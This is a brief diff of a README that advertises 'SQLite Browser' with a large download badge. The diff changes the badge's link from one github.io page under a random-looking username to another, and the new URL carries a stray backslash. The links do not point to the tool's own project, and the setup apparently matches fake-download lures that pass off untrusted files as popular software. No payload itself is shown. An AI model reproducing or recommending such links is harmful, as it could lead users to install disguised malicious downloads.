@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://upload.wikimedia.org/wikipedia/commons/thumb/3/38/SQLite370.svg/3840px-SQLite370.svg.png)
 
-[![GET SQLite Browser](https://img.shields.io/badge/GET%20SQLite%20Browser-0078D6?style=for-the-badge&logoColor=white)](https://westynsharprdzi.github.io/.github/sqlite-browser)
+[![GET SQLite Browser](https://img.shields.io/badge/GET%20SQLite%20Browser-0078D6?style=for-the-badge&logoColor=white)](\https://dustinphelpsizuu.github.io/.github/SQLite-browser)
 
 ---
 
